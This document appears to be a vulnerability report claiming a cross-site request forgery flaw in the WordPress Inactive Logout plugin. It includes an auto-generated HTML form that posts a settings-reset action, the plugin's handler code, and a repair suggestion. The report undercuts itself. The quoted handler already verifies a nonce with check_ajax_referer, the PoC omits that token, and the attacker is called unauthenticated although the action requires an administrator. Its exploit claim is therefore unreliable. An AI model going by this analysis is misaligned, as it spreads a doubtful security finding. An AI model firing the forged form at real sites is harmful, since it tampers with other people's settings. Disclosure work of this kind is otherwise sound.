Wordpress-Inactive Logout csrf vulnerability  
Affected Version: Latest Version; Affected Scope: >10000 
Bug Description: 
WordPress's Inactive Logout plugin is vulnerable to cross-site request forgery, which allows an unauthenticated attacker to reset the plugin's settings via a forged request. 
POC：
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="ina&#95;reset&#95;adv&#95;settings" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

 Code Analysis: 
 This code uses the check_ajax_referrer () function to check for CSRF tokens from the_ina_security_nonce parameter. 
However, this function can only check tokens in AJAX requests and does not perform CSRF validation for other types of requests. 
code:
public function ina_reset_adv_settings() {
		if ( ! current_user_can( 'manage_options' ) ) {
			exit;
		}

		check_ajax_referer( '_ina_security_nonce', 'security' );

		delete_option( '__ina_roles' );
		delete_option( '__ina_enable_timeout_multiusers' );
		delete_option( '__ina_multiusers_settings' );

		if ( wp_doing_ajax() && get_current_blog_id() == get_main_network_id() && is_multisite() ) {
			delete_site_option( '__ina_roles' );
			delete_site_option( '__ina_enable_timeout_multiusers' );
			delete_site_option( '__ina_multiusers_settings' );
		}

		Helpers::update_option( '__ina_saved_options', __( 'Role based settings reset.', 'inactive-logout' ) );

		wp_send_json( array(
			'code' => 1,
			'msg'  => esc_html__( 'Reset advanced settings successful.', 'inactive-logout' ),
		) );

		wp_die();
	}


 Repair suggestions: 
 It is recommended that CSRF token validation be added to HTML forms or any other trigger function. 
You can use the wp_create_nonce() function to generate a unique CSRF token and add it to a form or URL.
The token validity is then verified using the wp_verify_nonce() function in the handler function ina_reset_adv_settings(). 
